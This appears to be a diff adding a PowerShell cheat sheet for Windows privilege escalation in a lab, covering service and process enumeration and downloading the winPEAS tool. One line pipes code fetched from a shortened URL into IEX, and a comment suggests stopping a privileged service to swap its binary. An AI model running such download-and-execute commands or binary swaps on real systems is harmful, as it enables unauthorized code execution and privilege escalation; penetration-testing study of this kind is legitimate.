@@ -1,0 +1,54 @@
+Check current running services
+powershell -c "Get-Service | Where Status -eq "Running" "
+
+Download file from internet
+powershell -c "$WebClient = New-Object System.Net.WebClient; $WebClient.DownloadFile("https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/winPEAS/bin/x64/Release/winPEAS.exe", "winPEAS.exe")"
+
+powershell -c "Invoke-WebRequest -Uri "https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/winPEAS/bin/x64/Release/winPEAS.exe" -OutFile winPeas.exe"
+
+powershell -c "Add-Content -Path ip_address -Value New-Object System.Net.WebClient.DownloadString("http://myip.dnsomatic.com")"
+powershell -nop -noe -Command IEX "(New-Object System.Net.WebClient).DownloadString('https://tinyurl.com/y5nupk4e')"
+
+Check for the running services (TaskManager)
+powershell -c "Tasklist /SVC"
+
+Extract files with powershell, Expand-Archive should be installed
+powershell -c "Expand-Archive -LiteralPath winPEAS.zip -DestinationPath winPEAS"
+powershell -c "Compress-Archive"
+
+Display priveledged services (localSystem), filter Windows sytem services.
+powershell -c "Get-WmiObject win32_service | where PathName -notlike "C:\Windows\*" | Format-List *"
+powershell -c "Get-WmiObject win32_service | Where-Object StartName -eq "LocalSystem" | where PathName -notlike "C:\Windows\*" "
+powershell -c "Get-WmiObject win32_service | where PathName -notlike "C:\Windows\*" | Format-Table name, startname, startmode, pathname"
+
+name                startname           startmode           pathname
+----                ---------           ---------           --------
+AdvancedSystemCa... LocalSystem         Auto                C:\Program Files...
+AmazonSSMAgent      LocalSystem         Auto                "C:\Program File...
+AWSLiteAgent        LocalSystem         Auto                C:\Program Files...
+Ec2Config           LocalSystem         Auto                "C:\Program File...
+IObitUnSvr          LocalSystem         Auto                C:\Program Files...
+LiveUpdateSvc       LocalSystem         Auto                C:\Program Files...
+
+List what attributes are available and could be used for output.
+powershell -c "Get-Service AdvancedSystemCareService9 | Format-List *"
+
+Check what services could be shuted down. Gives us great opportunity to try stop the service, update its binary and start it again.
+powershell -c "Get-Service | where {$_.status -eq 'running'} | Format-Table displayname, canshutdown, status"
+powershell -c "Get-Service | Where-Object  CanShutdown -eq "true"  | Format-Table name, displayname, status"
+
+Get all the attributes available for the win32_service.
+powershell -c "Get-WmiObject win32_service | Format-List *"
+powershell -c "Get-Process | Where-Object PriorityClass -eq "Normal" "
+
+Get the list of running processes in memory.
+powershell -c "Get-Process | Format-List *"
+
+Get help for the PS1 cmdlet
+powershell -c "Get-Help Get-WmiObject"
+
+Get the list of objects who has name "service" in them.
+powershell -c "Get-WmiObject -list "*service*" "
+
+Select win32_service and pull data from it.
+powershell -c "Get-WmiObject win32_service | Format-Table name, startname, startmode, pathname"
